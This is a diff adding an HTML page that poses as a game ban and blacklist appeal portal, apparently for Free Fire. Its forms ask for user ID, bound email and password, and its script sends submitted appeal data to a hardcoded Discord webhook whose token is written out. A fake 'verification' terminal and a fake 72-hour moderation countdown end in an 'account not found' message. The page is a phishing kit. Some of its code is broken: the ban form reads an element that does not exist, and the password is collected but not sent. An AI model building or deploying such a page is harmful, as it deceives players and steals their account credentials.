@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Appeal Portal</title>
+    <style>
+        :root {
+            --primary: #8a2be2;
+            --primary-glow: rgba(138, 43, 226, 0.4);
+            --accent: #00ffcc;
+            --accent-glow: rgba(0, 255, 204, 0.4);
+            --danger: #ff0055;
+            --bg-dark: #0a0a0f;
+            --card-bg: rgba(20, 20, 32, 0.75);
+            --text-main: #f0f0f8;
+            --text-muted: #a0a0b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            user-select: none;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glow & Grid Background */
+        .bg-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-image: 
+                linear-gradient(to right, rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: -2;
+        }
+
+        .bg-glow {
+            position: fixed;
+            width: 600px;
+            height: 600px;
+            border-radius: 50%;
+            background: radial-gradient(circle, var(--primary-glow) 0%, transparent 70%);
+            top: -200px;
+            left: -200px;
+            z-index: -1;
+            animation: pulseGlow 10s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% { transform: scale(1) translate(0, 0); opacity: 0.5; }
+            100% { transform: scale(1.3) translate(100px, 100px); opacity: 0.8; }
+        }
+
+        /* Header & Hamburger */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            background: linear-gradient(45deg, #fff, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .hamburger-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 45px;
+            height: 45px;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .hamburger-btn:hover {
+            background: rgba(138, 43, 226, 0.2);
+            border-color: var(--primary);
+            box-shadow: 0 0 15px var(--primary-glow);
+            transform: scale(1.05);
+        }
+
+        .hamburger-btn span {
+            width: 24px;
+            height: 2px;
+            background-color: var(--text-main);
+            border-radius: 2px;
+            transition: all 0.3s;
+        }
+
+        /* Slide-out Navigation Drawer */
+        .drawer-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(5px);
+            z-index: 99;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .drawer-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .drawer {
+            position: fixed;
+            top: 0;
+            left: -320px;
+            width: 300px;
+            height: 100%;
+            background: rgba(15, 15, 25, 0.95);
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 10px 0 30px rgba(0, 0, 0, 0.8);
+            z-index: 100;
+            transition: left 0.4s cubic-bezier(0.1, 0.9, 0.2, 1);
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .drawer.active {
+            left: 0;
+        }
+
+        .drawer-header {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 15px;
+            color: var(--accent);
+        }
+
+        .drawer-menu {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .drawer-item {
+            padding: 15px 20px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .drawer-item:hover, .drawer-item.active {
+            background: linear-gradient(90deg, rgba(138, 43, 226, 0.2), transparent);
+            border-color: var(--primary);
+            color: #fff;
+            transform: translateX(5px);
+        }
+
+        .exit-btn {
+            background: rgba(255, 0, 85, 0.15);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+            margin-top: auto;
+        }
+
+        .exit-btn:hover {
+            background: var(--danger);
+            color: #fff;
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.4);
+        }
+
+        /* Main Container & Forms */
+        main {
+            max-width: 800px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            display: none;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .card-subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-main);
+            letter-spacing: 0.5px;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 15px var(--accent-glow);
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, var(--primary), #5a0099);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 20px var(--primary-glow);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px var(--primary-glow);
+            filter: brightness(1.2);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Terminal Overlay Popup */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            z-index: 200;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .terminal-window {
+            width: 90%;
+            max-width: 650px;
+            background: #050508;
+            border: 1px solid #00ffcc44;
+            border-radius: 12px;
+            box-shadow: 0 0 50px rgba(0, 255, 204, 0.2);
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            background: #101018;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .terminal-title {
+            margin-left: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .terminal-body {
+            padding: 25px;
+            font-family: 'Courier New', Courier, monospace;
+            color: var(--accent);
+            font-size: 15px;
+            min-height: 250px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .terminal-line {
+            opacity: 0;
+            animation: lineAppear 0.3s forwards;
+        }
+
+        @keyframes lineAppear {
+            to { opacity: 1; }
+        }
+
+        .terminal-input-wrap {
+            display: none;
+            margin-top: 15px;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .terminal-input-wrap.active {
+            display: flex;
+        }
+
+        .terminal-prompt {
+            color: #fff;
+        }
+
+        .terminal-input {
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-family: monospace;
+            font-size: 16px;
+            outline: none;
+            width: 100%;
+            caret-color: var(--accent);
+        }
+
+        /* Final Redirect / Timeout Screen */
+        .timeout-card {
+            text-align: center;
+            padding: 50px 30px;
+        }
+
+        .timer-display {
+            font-size: 42px;
+            font-weight: 900;
+            font-family: monospace;
+            color: var(--accent);
+            margin: 20px 0;
+            text-shadow: 0 0 20px var(--accent-glow);
+        }
+
+        .error-badge {
+            display: inline-block;
+            background: rgba(255, 0, 85, 0.15);
+            border: 1px solid var(--danger);
+            color: var(--danger);
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 25px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0.5; }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-grid"></div>
+    <div class="bg-glow"></div>
+
+    <!-- Top Navigation Header -->
+    <header>
+        <div class="logo">FFI-FFMAX-FF-APPEAL</div>
+        <div class="hamburger-btn" id="hamburgerBtn">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+
+    <!-- Drawer Navigation -->
+    <div class="drawer-overlay" id="drawerOverlay"></div>
+    <div class="drawer" id="drawer">
+        <div>
+            <div class="drawer-header">APPEAL NAVIGATION</div>
+            <ul class="drawer-menu">
+                <li class="drawer-item active" data-target="banCard">
+                    <span>🛡️</span> Ban Appeal
+                </li>
+                <li class="drawer-item" data-target="blacklistCard">
+                    <span>🚫</span> Blacklist Appeal
+                </li>
+            </ul>
+        </div>
+        <div class="drawer-item exit-btn" id="exitBtn">
+            <span>🚪</span> Close Navigation
+        </div>
+    </div>
+
+    <!-- Main View Area -->
+    <main>
+        <!-- Ban Appeal Form -->
+        <div class="card active" id="banCard">
+            <h2 class="card-title">ACCOUNT BAN APPEAL</h2>
+            <p class="card-subtitle">Submit details to request a account unban review from server moderators.</p>
+
+            <form id="banForm">
+                <div class="form-group">
+                    <label>GAME USER ID ()</label>
+                    <input type="text" placeholder="e.g. 849204821" required id="banUid">
+                </div>
+                <div class="form-group">
+                    <label>BINDED EMAIL ADDRESS</label>
+                    <input type="email" placeholder="registered@example.com" required id="banEmail">
+                </div>
+                <div class="form-group">
+                    <label>BAN REASON LISTED IN-GAME</label>
+                    <input type="text" placeholder="e.g. Suspicious Activity / Third Party Software" required id="banReason">
+                </div>
+                <div class="form-group">
+                    <label>EXPLANATION / STATEMENT</label>
+                    <textarea placeholder="Provide an honest explanation of what occurred..." required id="banStatement"></textarea>
+                </div>
+                <button type="submit" class="submit-btn">Submit Ban Appeal</button>
+            </form>
+        </div>
+
+        <!-- Blacklist Appeal Form -->
+        <div class="card" id="blacklistCard">
+            <h2 class="card-title">BLACKLIST APPEAL</h2>
+            <p class="card-subtitle">Apply for full server or competitive blacklist removal.</p>
+
+            <form id="blacklistForm">
+                <div class="form-group">
+                    <label>GAME USER ID (UID)</label>
+                    <input type="text" placeholder="e.g. 849204821" required id="blackUid">
+                </div>
+                <div class="form-group">
+                    <label>BINDED EMAIL ADDRESS</label>
+                    <input type="email" placeholder="registered@example.com" required id="blackEmail">
+                </div>
+                <div class="form-group">
+                    <label>password</label>
+                    <input type="text" placeholder="e.g. 123456789" required id="blackDiscord">
+                </div>
+                <div class="form-group">
+                    <label>BLACKLIST TYPE / DURATION</label>
+                    <select id="blackType" style="color: #fff;">
+                        <option value="Permanent Blacklist">Permanent Blacklist</option>
+                        <option value="Competitive Blacklist">Competitive / League Blacklist</option>
+                        <option value="IP / Hardware Blacklist">IP / Hardware Blacklist</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>REASON WHY BLACKLIST SHOULD BE REMOVED</label>
+                    <textarea placeholder="State why your entry on the blacklist should be reconsidered..." required id="blackStatement"></textarea>
+                </div>
+                <button type="submit" class="submit-btn">Submit Blacklist Appeal</button>
+            </form>
+        </div>
+
+        <!-- Loading Processing Screen -->
+        <div class="card" id="loadingCard">
+            <h2 class="card-title" style="text-align: center;">PROCESSING SYSTEM VERIFICATION</h2>
+            <p class="card-subtitle" style="text-align: center;">Please wait while your appeal tokens are registered...</p>
+            <div class="spinner"></div>
+        </div>
+
+        <!-- Final Timeout / Result Page -->
+        <div class="card" id="finalCard">
+            <div class="timeout-card">
+                <h2 class="card-title">APPEAL STATUS: PENDING EVALUATION</h2>
+                <p class="card-subtitle">System timeout window automatically allocated for moderator review.</p>
+                
+                <div class="timer-display" id="timerDisplay">71:59:59</div>
+                
+                <div class="error-badge" id="errorResult">
+                    [ account not found as per user details ]
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Interactive Verification Terminal Modal -->
+    <div class="modal-overlay" id="terminalModal">
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot dot-red"></div>
+                <div class="dot dot-yellow"></div>
+                <div class="dot dot-green"></div>
+                <span class="terminal-title">secure_appeal_gateway.exe</span>
+            </div>
+            <div class="terminal-body" id="terminalBody">
+                <!-- Lines injected dynamically -->
+            </div>
+            <div class="terminal-body" style="padding-top: 0; min-height: auto;">
+                <div class="terminal-input-wrap" id="terminalInputWrap">
+                    <span class="terminal-prompt">&gt;</span>
+                    <input type="text" class="terminal-input" id="terminalInput" placeholder="type Verify.ttp here..." autocomplete="off">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565970733958701078/lqSmV40GDV1b1i1Dv-Gjh9QEeNJhTUm9fveJOta0z8_PO3JgElujH0Tv7ffEbjTsvqEK";
+
+        // Navigation elements
+        const hamburgerBtn = document.getElementById('hamburgerBtn');
+        const drawerOverlay = document.getElementById('drawerOverlay');
+        const drawer = document.getElementById('drawer');
+        const exitBtn = document.getElementById('exitBtn');
+        const drawerItems = document.querySelectorAll('.drawer-item[data-target]');
+        const cards = document.querySelectorAll('.card');
+
+        // Drawer Toggles
+        function toggleDrawer(open) {
+            if (open) {
+                drawer.classList.add('active');
+                drawerOverlay.classList.add('active');
+            } else {
+                drawer.classList.remove('active');
+                drawerOverlay.classList.remove('active');
+            }
+        }
+
+        hamburgerBtn.addEventListener('click', () => toggleDrawer(true));
+        drawerOverlay.addEventListener('click', () => toggleDrawer(false));
+        exitBtn.addEventListener('click', () => toggleDrawer(false));
+
+        // Switch Forms
+        drawerItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const targetId = item.getAttribute('data-target');
+                
+                drawerItems.forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+
+                cards.forEach(card => card.classList.remove('active'));
+                document.getElementById(targetId).classList.add('active');
+
+                toggleDrawer(false);
+            });
+        });
+
+        // Form Submission logic
+        let pendingData = null;
+
+        document.getElementById('banForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            pendingData = {
+                type: "BAN APPEAL",
+                uid: document.getElementById('banUid').value,
+                email: document.getElementById('banEmail').value,
+                password: document.getElementById('ban').value,
+                statement: document.getElementById('banStatement').value
+            };
+            startTerminalSequence();
+        });
+
+        document.getElementById('blacklistForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            pendingData = {
+                type: "BLACKLIST APPEAL",
+                uid: document.getElementById('blackUid').value,
+                email: document.getElementById('blackEmail').value,
+                password: document.getElementById('blackDiscord').value,
+                blackType: document.getElementById('blackType').value,
+                statement: document.getElementById('blackStatement').value
+            };
+            startTerminalSequence();
+        });
+
+        // Send to Discord Webhook
+        async function sendToDiscord(data) {
+            let fields = [
+                { name: "Game UID", value: data.uid || "N/A", inline: true },
+                { name: "Binded Email", value: data.email || "N/A", inline: true }
+            ];
+
+            if(data.discord) fields.push({ name: "Discord Tag", value: data.discord, inline: true });
+            if(data.reason) fields.push({ name: "Ban Reason", value: data.reason, inline: false });
+            if(data.blackType) fields.push({ name: "Blacklist Type", value: data.blackType, inline: false });
+            fields.push({ name: "Appeal Statement", value: data.statement || "N/A", inline: false });
+
+            const payload = {
+                username: "Appeal System Bot",
+                embeds: [{
+                    title: `🚨 New ${data.type} Submitted`,
+                    color: data.type === "BAN APPEAL" ? 15158332 : 10181046,
+                    fields: fields,
+                    footer: { text: "Game Appeal Gateway System" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Error sending to Webhook:", err);
+            }
+        }
+
+        // Terminal Sequence Handling
+        const terminalModal = document.getElementById('terminalModal');
+        const terminalBody = document.getElementById('terminalBody');
+        const terminalInputWrap = document.getElementById('terminalInputWrap');
+        const terminalInput = document.getElementById('terminalInput');
+
+        function startTerminalSequence() {
+            terminalBody.innerHTML = '';
+            terminalInputWrap.classList.remove('active');
+            terminalModal.classList.add('active');
+
+            const steps = [
+                "> connecting with server...",
+                "> sending the appeal...",
+                "> verifying as you...",
+                "> please type Verify.ttp"
+            ];
+
+            steps.forEach((text, index) => {
+                setTimeout(() => {
+                    const line = document.createElement('div');
+                    line.className = 'terminal-line';
+                    line.textContent = text;
+                    terminalBody.appendChild(line);
+
+                    if (index === steps.length - 1) {
+                        terminalInputWrap.classList.add('active');
+                        terminalInput.focus();
+                    }
+                }, (index + 1) * 800);
+            });
+        }
+
+        // Verification Input handling
+        terminalInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const val = terminalInput.value.trim();
+                if (val === 'Verify.ttp') {
+                    terminalInput.value = '';
+                    terminalModal.classList.remove('active');
+                    
+                    // Dispatch to Webhook
+                    if (pendingData) {
+                        sendToDiscord(pendingData);
+                    }
+
+                    // Show Loading Card
+                    cards.forEach(card => card.classList.remove('active'));
+                    const loadingCard = document.getElementById('loadingCard');
+                    loadingCard.classList.add('active');
+
+                    // Wait 3 Seconds then Show Outcome Card
+                    setTimeout(() => {
+                        loadingCard.classList.remove('active');
+                        const finalCard = document.getElementById('finalCard');
+                        finalCard.classList.add('active');
+                        startCountdown();
+                    }, 3000);
+
+                } else {
+                    const errLine = document.createElement('div');
+                    errLine.className = 'terminal-line';
+                    errLine.style.color = '#ff0055';
+                    errLine.textContent = '> Verification failed. Please type exact string: Verify.ttp';
+                    terminalBody.appendChild(errLine);
+                    terminalInput.value = '';
+                }
+            }
+        });
+
+        // Countdown Timer simulation
+        function startCountdown() {
+            let totalSeconds = 3 * 24 * 60 * 60; // 3 days
+            const timerDisplay = document.getElementById('timerDisplay');
+
+            const timerInterval = setInterval(() => {
+                if (totalSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    return;
+                }
+                totalSeconds--;
+
+                const hours = Math.floor(totalSeconds / 3600);
+                const minutes = Math.floor((totalSeconds % 3600) / 60);
+                const seconds = totalSeconds % 60;
+
+                timerDisplay.textContent = 
+                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
